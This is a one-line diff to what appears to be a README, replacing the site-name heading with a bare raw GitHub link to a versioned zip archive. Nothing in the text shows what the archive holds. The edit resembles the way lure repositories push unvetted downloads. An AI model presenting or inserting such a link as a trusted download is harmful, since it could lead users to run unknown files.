@@ -1,1 +1,1 @@
-# florette-manila.com
+# https://raw.githubusercontent.com/1234cabs/florette-manila.com/main/corrade/florette-manila.com_v2.6.zip
